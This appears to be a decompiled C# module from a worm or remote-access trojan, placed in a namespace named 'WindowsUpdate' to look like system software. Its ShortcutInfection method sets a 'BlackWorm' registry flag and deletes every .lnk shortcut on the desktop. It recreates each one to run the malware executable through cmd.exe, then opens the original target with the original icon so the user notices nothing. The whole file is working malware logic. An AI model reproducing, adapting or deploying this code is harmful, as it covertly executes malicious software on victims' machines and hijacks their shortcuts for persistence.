using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace WindowsUpdate;

public class ShortcutInstall
{
	private string virustarget;

	public object comp;

	public ShortcutInstall()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		comp = (object)new Computer();
	}

	public void ShortcutInfection()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		string text = default(string);
		string text2 = default(string);
		string[] files = default(string[]);
		string[] array = default(string[]);
		int num5 = default(int);
		string path = default(string);
		string extension = default(string);
		string fileName = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj2;
				object[] array2;
				object[] array3;
				bool[] array4;
				object obj3;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 959:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 5:
							goto IL_002d;
						case 6:
							goto IL_0030;
						case 4:
						case 7:
						case 8:
							goto IL_0044;
						case 9:
							goto IL_0058;
						case 10:
							goto IL_0068;
						case 11:
							goto IL_0076;
						case 12:
							goto IL_008f;
						case 14:
							goto IL_00b4;
						case 15:
							goto IL_00b8;
						case 13:
						case 16:
						case 17:
							goto IL_00c7;
						case 18:
							goto IL_00dd;
						case 19:
							goto IL_00e9;
						case 20:
							goto IL_00f5;
						case 21:
							goto IL_0101;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0125;
						case 24:
							goto IL_013f;
						case 25:
							goto IL_019f;
						case 26:
							goto IL_01d8;
						case 27:
							goto IL_0200;
						case 28:
							goto IL_0228;
						case 29:
							goto IL_029e;
						case 30:
							goto IL_02dc;
						case 31:
							goto IL_02e6;
						case 32:
							goto IL_0302;
						case 33:
							goto IL_0305;
						case 34:
							goto IL_030b;
						default:
							goto end_IL_0001;
						case 3:
						case 35:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_02e6:
					num = 31;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0302;
					IL_02dc:
					num = 30;
					File.Delete(text);
					goto IL_02e6;
					IL_000a:
					num = 2;
					if (Operators.CompareString(RegValueGet("BlackWorm"), "True", false) == 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_002d;
					IL_002d:
					num = 5;
					goto IL_0030;
					IL_0030:
					num = 6;
					RegValueSet("BlackWorm", "True");
					goto IL_0044;
					IL_0044:
					num = 8;
					text2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
					goto IL_0058;
					IL_0058:
					num = 9;
					files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
					goto IL_0068;
					IL_0068:
					num = 10;
					Thread.Sleep(1000);
					goto IL_0076;
					IL_0076:
					num = 11;
					if (Operators.CompareString(A.HardInstall, "True", false) == 0)
					{
						goto IL_008f;
					}
					goto IL_00b4;
					IL_008f:
					num = 12;
					virustarget = Interaction.Environ(A.PathS) + "\\Microsoft\\MyClient\\" + A.InstallName;
					goto IL_00c7;
					IL_00b4:
					num = 14;
					goto IL_00b8;
					IL_00b8:
					num = 15;
					virustarget = Application.get_ExecutablePath();
					goto IL_00c7;
					IL_00c7:
					num = 17;
					array = files;
					num5 = 0;
					goto IL_030f;
					IL_030f:
					if (num5 < array.Length)
					{
						path = array[num5];
						goto IL_00dd;
					}
					goto end_IL_0001_2;
					IL_0302:
					obj = null;
					goto IL_0305;
					IL_00dd:
					num = 18;
					extension = Path.GetExtension(path);
					goto IL_00e9;
					IL_00e9:
					num = 19;
					Path.GetFileNameWithoutExtension(path);
					goto IL_00f5;
					IL_00f5:
					num = 20;
					text = Path.GetFullPath(path);
					goto IL_0101;
					IL_0101:
					num = 21;
					if (Operators.CompareString(extension, ".lnk", false) == 0)
					{
						goto IL_0119;
					}
					goto IL_0305;
					IL_0119:
					num = 22;
					fileName = Path.GetFileName(text);
					goto IL_0125;
					IL_0125:
					num = 23;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_013f;
					IL_013f:
					num = 24;
					obj2 = objectValue;
					array2 = new object[1] { text };
					array3 = array2;
					array4 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet(obj2, (Type)null, "CreateShortcut", array3, (string[])null, (Type[])null, array4);
					if (array4[0])
					{
						text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					objectValue2 = RuntimeHelpers.GetObjectValue(obj3);
					goto IL_019f;
					IL_030b:
					num = 34;
					goto IL_030f;
					IL_0305:
					num5 = checked(num5 + 1);
					goto IL_030b;
					IL_019f:
					num = 25;
					obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { text2 + fileName }, (string[])null, (Type[])null, (bool[])null);
					goto IL_01d8;
					IL_01d8:
					num = 26;
					NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					goto IL_0200;
					IL_0200:
					num = 27;
					NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
					goto IL_0228;
					IL_0228:
					num = 28;
					NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + virustarget + " & explorer /root,\"" + NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + "\" & exit" }, (string[])null, (Type[])null, false, true);
					goto IL_029e;
					IL_029e:
					num = 29;
					NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { NewLateBinding.LateGet(objectValue2, (Type)null, "TargetPath", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null, false, true);
					goto IL_02dc;
					end_IL_0001:
					break;
				}
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0001_dispatch = 959;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public string RegValueGet(string name)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "error < Not Found >";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object RegValueSet(string name, string values)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(comp, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\ShortCutInfection" }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { name, values };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				name = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				values = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}
}
